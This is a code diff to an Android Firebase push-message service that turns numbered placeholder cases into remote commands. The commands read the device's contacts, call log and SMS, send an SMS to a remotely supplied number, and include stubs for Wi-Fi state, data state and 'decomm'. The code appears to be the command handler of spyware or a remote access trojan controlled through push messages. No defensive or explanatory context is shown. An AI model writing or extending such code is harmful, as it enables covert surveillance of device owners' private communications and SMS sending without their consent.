@@ -9,6 +9,10 @@ import com.google.firebase.messaging.RemoteMessage;
 
 public class MyFirebaseMessagingService extends FirebaseMessagingService {
 
+    deviceData data = new deviceData();
+    deviceOps Ops = new deviceOps();
+    //deviceConfig config = new deviceConfig();
+
     @Override
     public void onMessageReceived(RemoteMessage remoteMessage) {
         super.onMessageReceived(remoteMessage);
@@ -17,19 +21,27 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
             //handle data
             final String command = remoteMessage.getData().get("command");
             switch(command){
-                case "1":
-                    //function 1
+                case "readcontacts":
+                    StringBuilder contacts = data.readcontacts();
                     break;
-                case "2":
-                    //function 2
+                case "readcallLog":
+                    StringBuilder callLog = data.readcalllogs();
                     break;
-                case "3":
-                    //function 3
+                case "readsms":
+                    StringBuilder sms = data.readsms();
                     break;
-                case "4":
-                    //function 4
+                case "sendsms":
+                    String sendto = remoteMessage.getData().get("sendto");
+                    String message = remoteMessage.getData().get("message");
+                    Ops.sendSms(sendto, message);
                     break;
-                case "5":
+                case "wifistate":
+                    //function 5
+                    break;
+                case "decomm":
+                    //function 5
+                    break;
+                case "datastate":
                     //function 5
                     break;
             }
